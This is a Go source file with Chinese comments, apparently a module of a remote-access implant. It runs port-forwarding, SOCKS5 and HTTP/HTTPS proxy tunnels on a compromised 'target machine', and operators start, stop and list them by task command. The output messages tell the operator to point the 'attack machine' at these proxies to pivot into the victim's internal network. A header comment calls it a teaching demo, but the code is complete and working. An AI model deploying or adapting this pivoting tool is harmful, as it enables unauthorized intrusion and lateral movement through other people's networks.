package main

import (
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

// 内网穿透: 端口转发 / SOCKS5 代理 / HTTP 代理
// 教学演示版: 在目标机本地监听，通过任务结果回传状态
// 隧道状态保存在 tunnels 全局表，支持 start/stop/list

type tunnelEntry struct {
	tunnelType string
	info       string
	listener   net.Listener
	stopCh     chan struct{}
}

var (
	tunnels = make(map[string]*tunnelEntry)
	tunMu   sync.Mutex
)

func genTunnelID() string {
	return fmt.Sprintf("T%d%03d", time.Now().UnixNano()/1e9%100000, rand.Intn(900)+100)
}

func tunnelList(typ string) string {
	tunMu.Lock()
	defer tunMu.Unlock()
	var items []string
	for tid, t := range tunnels {
		if t.tunnelType == typ {
			items = append(items, fmt.Sprintf("[%s] %s", tid, t.info))
		}
	}
	if len(items) == 0 {
		switch typ {
		case "port_forward":
			return "(无端口转发隧道)"
		case "socks5":
			return "(无 SOCKS5 代理隧道)"
		case "http_proxy":
			return "(无 HTTP 代理隧道)"
		}
		return "(无隧道)"
	}
	return strings.Join(items, "\n")
}

func tunnelStop(tid string, label string) string {
	tunMu.Lock()
	t, ok := tunnels[tid]
	if !ok {
		tunMu.Unlock()
		return fmt.Sprintf("[-] 隧道不存在: %s", tid)
	}
	delete(tunnels, tid)
	tunMu.Unlock()
	if t.stopCh != nil {
		close(t.stopCh)
	}
	if t.listener != nil {
		_ = t.listener.Close()
	}
	return fmt.Sprintf("[+] %s已停止: %s", label, tid)
}

// pipe 双向转发，任一方关闭则结束
func pipe(src, dst net.Conn) {
	defer src.Close()
	defer dst.Close()
	_, _ = io.Copy(dst, src)
}

// ===== 端口转发 =====

func taskPortForward(d map[string]interface{}) string {
	action := tdGetString(d, "action", "list")
	if action == "list" {
		return tunnelList("port_forward")
	}
	if action == "stop" {
		return tunnelStop(tdGetString(d, "tunnel_id", ""), "端口转发")
	}
	// start
	localPort := tdGetInt(d, "local_port", 0)
	targetHost := tdGetString(d, "target_host", "")
	targetPort := tdGetInt(d, "target_port", 0)
	if localPort == 0 || targetHost == "" || targetPort == 0 {
		return "[-] 参数错误: 需要 local_port, target_host, target_port"
	}
	addr := fmt.Sprintf("0.0.0.0:%d", localPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return "[-] 启动失败: " + err.Error()
	}
	stopCh := make(chan struct{})
	tid := genTunnelID()
	info := fmt.Sprintf("端口转发 0.0.0.0:%d -> %s:%d", localPort, targetHost, targetPort)
	tunMu.Lock()
	tunnels[tid] = &tunnelEntry{tunnelType: "port_forward", info: info, listener: ln, stopCh: stopCh}
	tunMu.Unlock()

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			select {
			case <-stopCh:
				conn.Close()
				return
			default:
			}
			go func(c net.Conn) {
				remote, err := net.Dial("tcp", net.JoinHostPort(targetHost, strconv.Itoa(targetPort)))
				if err != nil {
					c.Close()
					return
				}
				go pipe(c, remote)
				pipe(remote, c)
			}(conn)
		}
	}()
	return fmt.Sprintf("[+] 端口转发已启动 [%s]\n    0.0.0.0:%d -> %s:%d\n    在目标机本地访问 127.0.0.1:%d 即可连接到 %s:%d",
		tid, localPort, targetHost, targetPort, localPort, targetHost, targetPort)
}

// ===== SOCKS5 代理 =====

func taskSocks5Proxy(d map[string]interface{}) string {
	action := tdGetString(d, "action", "list")
	if action == "list" {
		return tunnelList("socks5")
	}
	if action == "stop" {
		return tunnelStop(tdGetString(d, "tunnel_id", ""), "SOCKS5 代理")
	}
	port := tdGetInt(d, "port", 1080)
	username := tdGetString(d, "username", "")
	password := tdGetString(d, "password", "")

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return "[-] 启动失败: " + err.Error()
	}
	stopCh := make(chan struct{})
	tid := genTunnelID()
	authInfo := " (无认证)"
	if username != "" {
		authInfo = fmt.Sprintf(" (认证: %s)", username)
	}
	info := fmt.Sprintf("SOCKS5 代理 0.0.0.0:%d%s", port, authInfo)
	tunMu.Lock()
	tunnels[tid] = &tunnelEntry{tunnelType: "socks5", info: info, listener: ln, stopCh: stopCh}
	tunMu.Unlock()

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			select {
			case <-stopCh:
				conn.Close()
				return
			default:
			}
			go handleSocks5(conn, username, password)
		}
	}()
	return fmt.Sprintf("[+] SOCKS5 代理已启动 [%s]\n    监听: 0.0.0.0:%d%s\n    使用: 在攻击机上配置 SOCKS5 代理 -> 目标IP:%d",
		tid, port, authInfo, port)
}

func handleSocks5(client net.Conn, user, pwd string) {
	defer func() {
		_ = client.Close()
	}()
	buf := make([]byte, 512)
	// 握手阶段
	n, err := client.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	// nmethods = buf[1]（客户端提供的认证方法数，这里按是否有账密决定服务端响应）
	if user != "" && pwd != "" {
		// 要求用户名/密码认证 (0x02)
		_, _ = client.Write([]byte{0x05, 0x02})
		n, err = client.Read(buf)
		if err != nil || n < 2 || buf[0] != 0x01 {
			return
		}
		uLen := int(buf[1])
		if n < 2+uLen+1 {
			return
		}
		u := string(buf[2 : 2+uLen])
		pLen := int(buf[2+uLen])
		if n < 3+uLen+pLen {
			return
		}
		p := string(buf[3+uLen : 3+uLen+pLen])
		if u != user || p != pwd {
			_, _ = client.Write([]byte{0x01, 0x01}) // 认证失败
			return
		}
		_, _ = client.Write([]byte{0x01, 0x00}) // 认证成功
	} else {
		_, _ = client.Write([]byte{0x05, 0x00}) // 无需认证
	}

	// 请求阶段
	n, err = client.Read(buf)
	if err != nil || n < 7 || buf[0] != 0x05 {
		return
	}
	cmd := buf[1]
	atyp := buf[3]
	if cmd != 0x01 { // 只支持 CONNECT
		_, _ = client.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	var dstHost string
	var dstPort int
	switch atyp {
	case 0x01: // IPv4
		if n < 10 {
			return
		}
		dstHost = net.IP(buf[4:8]).String()
		dstPort = int(buf[8])<<8 | int(buf[9])
	case 0x03: // 域名
		if n < 5 {
			return
		}
		dlen := int(buf[4])
		if n < 7+dlen {
			return
		}
		dstHost = string(buf[5 : 5+dlen])
		dstPort = int(buf[5+dlen])<<8 | int(buf[6+dlen])
	default:
		_, _ = client.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	remote, err := net.DialTimeout("tcp", net.JoinHostPort(dstHost, strconv.Itoa(dstPort)), 10*time.Second)
	if err != nil {
		_, _ = client.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	localAddr := remote.LocalAddr().(*net.TCPAddr)
	bndHost := localAddr.IP.To4()
	if bndHost == nil {
		bndHost = net.IPv4zero
	}
	bndPort := localAddr.Port
	resp := []byte{0x05, 0x00, 0x00, 0x01, bndHost[0], bndHost[1], bndHost[2], bndHost[3], byte(bndPort >> 8), byte(bndPort)}
	_, _ = client.Write(resp)
	go pipe(client, remote)
	pipe(remote, client)
}

// ===== HTTP 代理 =====

func taskHttpProxy(d map[string]interface{}) string {
	action := tdGetString(d, "action", "list")
	if action == "list" {
		return tunnelList("http_proxy")
	}
	if action == "stop" {
		return tunnelStop(tdGetString(d, "tunnel_id", ""), "HTTP 代理")
	}
	port := tdGetInt(d, "port", 8080)

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return "[-] 启动失败: " + err.Error()
	}
	stopCh := make(chan struct{})
	tid := genTunnelID()
	info := fmt.Sprintf("HTTP 代理 0.0.0.0:%d", port)
	tunMu.Lock()
	tunnels[tid] = &tunnelEntry{tunnelType: "http_proxy", info: info, listener: ln, stopCh: stopCh}
	tunMu.Unlock()

	server := &http.Server{
		Handler: http.HandlerFunc(httpProxyHandler),
	}
	go func() {
		_ = server.Serve(ln)
	}()
	// 监听停止信号
	go func() {
		<-stopCh
		_ = server.Close()
	}()
	return fmt.Sprintf("[+] HTTP 代理已启动 [%s]\n    监听: 0.0.0.0:%d\n    使用: 在攻击机浏览器配置 HTTP 代理 -> 目标IP:%d",
		tid, port, port)
}

// httpProxyHandler 处理 HTTP/HTTPS 代理请求
func httpProxyHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodConnect {
		// HTTPS 隧道
		target := r.Host
		remote, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			http.Error(w, "Bad Gateway", http.StatusBadGateway)
			return
		}
		hj, ok := w.(http.Hijacker)
		if !ok {
			remote.Close()
			http.Error(w, "no hijack", http.StatusInternalServerError)
			return
		}
		client, _, err := hj.Hijack()
		if err != nil {
			remote.Close()
			return
		}
		_, _ = client.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))
		go pipe(client, remote)
		pipe(remote, client)
		return
	}
	// 普通 HTTP 请求: 转发
	outReq, err := http.NewRequest(r.Method, r.URL.String(), r.Body)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	for k, vs := range r.Header {
		if strings.EqualFold(k, "Host") || strings.EqualFold(k, "Content-Length") || strings.EqualFold(k, "Connection") {
			continue
		}
		for _, v := range vs {
			outReq.Header.Add(k, v)
		}
	}
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(outReq)
	if err != nil {
		http.Error(w, "Proxy Error: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	for k, vs := range resp.Header {
		for _, v := range vs {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)
	_, _ = io.Copy(w, resp.Body)
}
